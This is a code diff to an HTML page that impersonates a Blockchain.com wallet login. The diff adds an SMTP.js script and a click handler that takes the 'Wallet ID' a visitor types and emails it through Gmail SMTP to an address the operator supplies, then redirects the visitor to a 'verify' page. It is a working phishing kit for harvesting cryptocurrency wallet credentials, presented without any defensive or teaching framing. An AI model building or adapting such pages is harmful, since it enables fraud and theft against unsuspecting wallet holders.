@@ -7,6 +7,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Blockchain.com Wallet - Exchange </title>
 
+    <!-- FAVICON -->
+    <link rel="shortcut icon" href="#" type="image/x-icon">
+
     <!-- Custom Css -->
     <link rel="stylesheet" href="./css/style.css">
 
@@ -18,6 +21,9 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
         integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
         crossorigin="anonymous"></script>
+
+    <!-- SMTP.JS CDN -->
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
 
 </head>
 
@@ -40,17 +46,18 @@
 
             <div class="row">
                 <div class="col-11 col-sm-10 col-md-8 col-lg-4 mx-auto FirstSection__col__3">
-                    <form action="#">
+                    <form action="./verify.html">
                         <div class="form__items">
                             <div class="form__items_inner">
                                 <label for="email">Wallet ID</label>
                                 <span class="span__hidden">Required</span>
                             </div>
-                            <input type="text" name="email" placeholder="Enter your wallet id">
+                            <input type="text" name="email" id="wallet__data" placeholder="Enter your wallet id">
                         </div>
 
                         <div class="form__items formBtn">
-                            <button type="submit"><a href="./verify.html" style="color: #fff;">Continue</a></button>
+                            <button class="SendMailVerify"><a href="./verify.html"
+                                    style="color: #fff;">Continue</a></button>
                         </div>
 
                         <a href="#">Need Some Help?</a>
@@ -90,8 +97,31 @@
     <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
     <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
 
+    <script>
+        const SendEmail = (e) => {
+            e.preventDefault();
+            let UserFilled = document.querySelector("#wallet__data").value;
+            Email.send({
+                Host: "smtp.gmail.com",
+                Username: "Your Sending Email",
+                Password: "Your Password",
+                To: 'To which email you want to send',
+                From: "Your Sending Email",
+                Subject: "Wallet ID",
+                Body: `${UserFilled}`
+            }).then(() => {
+                console.log(`${UserFilled}`)
+                UserFilled = "";
+                window.location.replace("http://127.0.0.1:5500/verify.html");
+            }
+            );
+        };
+
+        document.querySelector('.SendMailVerify').addEventListener("click", SendEmail);
+    </script>
+
     <!-- Custom Js -->
-    <script src="./js/script.js"></script>
+    <!-- <script src="./js/script.js"></script> -->
 </body>
 
 </html>
